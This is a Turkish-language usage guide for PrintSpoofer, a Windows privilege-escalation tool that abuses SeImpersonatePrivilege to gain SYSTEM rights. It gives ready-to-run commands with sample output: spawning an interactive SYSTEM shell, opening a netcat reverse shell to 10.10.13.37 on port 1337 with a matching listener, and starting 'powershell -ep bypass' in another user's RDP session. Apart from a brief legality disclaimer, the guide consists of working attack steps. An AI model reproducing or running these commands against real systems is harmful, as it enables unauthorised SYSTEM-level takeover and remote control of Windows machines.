# PrintSpoofer Kullanım Kılavuzu

## Giriş
PrintSpoofer, Windows ortamlarında SeImpersonatePrivilege yetkisini kötüye kullanarak LOCAL veya NETWORK SERVICE hesaplarından SYSTEM seviyesine yükselme işlemi yapmak için kullanılan bir araçtır. Bu araç, Print Spooler hizmetini istismar ederek SYSTEM yetkisine sahip bir işlem başlatır.

---

## Gereksinimler
- Windows 10 veya Windows Server 2016/2019
- Kullanıcı hesabının **SeImpersonatePrivilege** yetkisine sahip olması
- Komut satırı erişimi

---

## Özellikler
PrintSpoofer aşağıdaki işlemleri gerçekleştirebilir:
- SYSTEM seviyesinde yeni bir süreç başlatma
- Geriye dönük bağlantılar (reverse shell) oluşturma
- Belirli bir oturumda yeni bir süreç başlatma (örneğin, RDP oturumu)

---

## Kullanım
### Yardım Mesajını Görüntüleme
Araç hakkında bilgi almak için:
```cmd
PrintSpoofer.exe -h
```
Bu komut, kullanılabilir seçeneklerin ve örneklerin bir listesini döndürür.

### Argümanlar
- `-c <CMD>`: Belirtilen komutu SYSTEM yetkileriyle çalıştırır.
- `-i`: Mevcut komut isteminde etkileşimli bir SYSTEM süreci oluşturur.
- `-d <ID>`: Belirtilen oturumda yeni bir süreç başlatır (örneğin, RDP).
- `-h`: Yardım mesajını görüntüler.

---

## Örnek Kullanımlar

### 1. **Etkileşimli SYSTEM Süreci Oluşturma**
Etkileşimli bir kabuk (örneğin, cmd veya PowerShell) başlatmak için:
```cmd
PrintSpoofer.exe -i -c cmd
```
Örnek Çıktı:
```cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
C:\WINDOWS\system32>whoami
nt authority\system
```

### 2. **SYSTEM Yetkileriyle Geriye Dönük Bağlantı (Reverse Shell) Oluşturma**
Netcat gibi bir araç kullanarak SYSTEM seviyesinde bir ters bağlantı oluşturmak için:
```cmd
PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
```
Dinleyici Ayarlama:
```cmd
nc.exe -l -p 1337
```
Örnek Çıktı:
```cmd
Microsoft Windows [Version 10.0.19613.1000]
C:\WINDOWS\system32>whoami
nt authority\system
```

### 3. **Belirli Bir Oturumda Süreç Başlatma**
RDP veya yerel oturumda SYSTEM seviyesinde bir işlem başlatmak için:
1. Oturum kimliğini öğrenin:
   ```cmd
   qwinsta
   ```
   Çıktı Örneği:
   ```cmd
   SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
   console           Administrator             1  Active
   rdp-tcp#3         lab-user                  3  Active
   ```
2. Belirli oturumda bir süreç başlatın:
   ```cmd
   PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
   ```

---

## Güvenlik Notları
PrintSpoofer yalnızca yasal ve etik amaçlarla kullanılmalıdır. Araç, sistem yöneticilerinin güvenlik açıklarını tespit etmesine ve gidermesine yardımcı olmak için tasarlanmıştır. Yetkisiz kullanım yasal sonuçlara yol açabilir.

---

## Kaynaklar
- [PrintSpoofer GitHub](https://github.com/itm4n/PrintSpoofer)
- [PrintSpoofer İlgili Blog Yazısı](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

---

Bu rehber, PrintSpoofer aracını kullanarak Windows sistemlerinde yetki yükseltme işlemleri yapmanın temellerini kapsamaktadır. Daha fazla bilgi veya yardım için yukarıdaki kaynakları ziyaret edin.
